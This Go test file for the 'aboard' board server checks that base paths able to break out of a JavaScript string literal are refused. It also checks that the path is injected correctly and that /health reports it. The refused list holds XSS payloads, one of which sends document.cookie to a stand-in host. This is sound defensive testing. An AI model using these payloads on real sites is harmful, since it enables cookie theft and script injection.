package aboard

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"io/fs"
	"log"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/exoport/aboard/pkg/aboard/web"
)

// The normalisation cases that are ABOUT validation live here beside it; the
// plain shape table stays in layout_test.go with the other path resolution.
// The injection. `serveShell` splices the normalised base into the shell as
// `window.ABOARD_BASE = "<base>";` — inside a JS STRING LITERAL — and nothing
// checked what was in it, so a double quote closed the literal and everything
// after it ran on the board's own origin. The flag belongs to whoever starts the
// server, which is what keeps this a hardening fix rather than a hole; it stops
// being that the moment a wrapper builds the flag from something it read.
func TestABasePathThatWouldEscapeTheScriptIsRefused(t *testing.T) {
	refused := []string{
		`/brd";alert(1)//`,
		`/brd";fetch("http://elsewhere/?"+document.cookie)//`,
		`/brd"`,
		`/a'b`,
		"/a\\b",
		"/a<b",
		"/a\nb",
		"/a b",
		"/a/../b", // not a traversal, but nonsense that would need explaining
		"/..",
		"/.",
		"/a/./b",
		"/a%2fb",
		"/a?b=1",
		"/a#b",
	}
	for _, raw := range refused {
		if err := ValidateBasePath(raw); err == nil {
			t.Errorf("ValidateBasePath(%q) allowed it", raw)
		}
	}

	accepted := []string{"", "/", "/aboard", "aboard", "/a/b/c", "/Board-v1.2", "/a_b", "/a-b", "/a~b"}
	for _, raw := range accepted {
		if err := ValidateBasePath(raw); err != nil {
			t.Errorf("ValidateBasePath(%q) refused a usable prefix: %v", raw, err)
		}
	}
}

// Serve refuses it too, for an embedder that never went through the CLI — and
// before it binds a port or touches a file.
func TestServeRefusesAnUnusableBasePath(t *testing.T) {
	root := Root(t.TempDir())
	err := Serve(context.Background(), Options{Logger: log.New(io.Discard, "", 0)},
		ServeConfig{Root: root, BasePath: `/brd";alert(1)//`})
	if err == nil {
		t.Fatal("Serve accepted a base path that cannot be one")
	}
	if !strings.Contains(err.Error(), "base path") {
		t.Errorf("the refusal does not name the base path: %v", err)
	}
}

// And the splice itself, end to end: the marker is replaced with exactly the
// normalised prefix and the literal is still a literal.
func TestServeShellInjectsTheBasePath(t *testing.T) {
	shell, err := fs.ReadFile(web.FS, "aboard.html")
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Contains(shell, []byte(basePlaceholder)) {
		t.Fatalf("aboard.html no longer ships the %s marker", basePlaceholder)
	}

	for _, base := range []string{"", "/brd", "/a/b"} {
		s := &server{
			opts:   Options{Logger: log.New(io.Discard, "", 0)},
			assets: web.FS,
			base:   NormalizeBasePath(base),
		}
		rec := httptest.NewRecorder()
		s.serveShell(rec, httptest.NewRequest(http.MethodGet, "/", http.NoBody))

		want := `window.ABOARD_BASE = "` + NormalizeBasePath(base) + `";`
		if !strings.Contains(rec.Body.String(), want) {
			t.Errorf("base %q: the shell does not carry %s", base, want)
		}
	}
}

// And the other direction: what a CLIENT of a prefixed board reads back.
//
// `Instance.Base` has carried the prefix since the port and nothing pinned it,
// because nothing in Go had a reason to look — it is read by an editor extension
// building its own URLs, which is the one caller no test here represents. It is
// `omitempty`, so the failure mode of a rename is not an error anywhere: the
// field simply stops appearing, and the client silently addresses the wrong
// path. `http-api.md` documents it by name now, which makes it a promise.
func TestHealthReportsTheBasePath(t *testing.T) {
	for _, base := range []string{"", "/brd"} {
		s := testServer(t, htmlTabBoard)
		s.base = NormalizeBasePath(base)
		if err := s.writeInstance(s.root, ""); err != nil {
			t.Fatalf("base %q: writing the instance record: %v", base, err)
		}

		rec := httptest.NewRecorder()
		s.route(rec, httptest.NewRequest(http.MethodGet,
			"http://localhost"+s.base+"/health", http.NoBody))
		if rec.Code != http.StatusOK {
			t.Fatalf("base %q: GET %s/health answered %d", base, s.base, rec.Code)
		}

		// Decoded as a map, not as an Instance: the question is what a client
		// reading JSON sees, and `omitempty` is invisible through the struct.
		var body map[string]any
		if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
			t.Fatalf("base %q: /health is not JSON: %v", base, err)
		}
		got, present := body["base"]
		switch {
		case base == "" && present:
			t.Errorf("a board at the server root reports base %q; the field is omitempty so a client can treat its absence as \"no prefix\"", got)
		case base != "" && got != s.base:
			t.Errorf("base %q: /health reports base %v, want %q", base, got, s.base)
		}

		// The instance file says the same thing, and it has to: a prefixed board
		// answers /health only AT the prefix, so a client that does not already
		// know it cannot learn it from there.
		raw, err := os.ReadFile(s.root.InstanceFile(""))
		if err != nil {
			t.Fatalf("base %q: reading the instance record: %v", base, err)
		}
		var rec2 map[string]any
		if err := json.Unmarshal(raw, &rec2); err != nil {
			t.Fatalf("base %q: the instance record is not JSON: %v", base, err)
		}
		if rec2["base"] != body["base"] {
			t.Errorf("base %q: the instance record says %v and /health says %v", base, rec2["base"], body["base"])
		}
	}
}
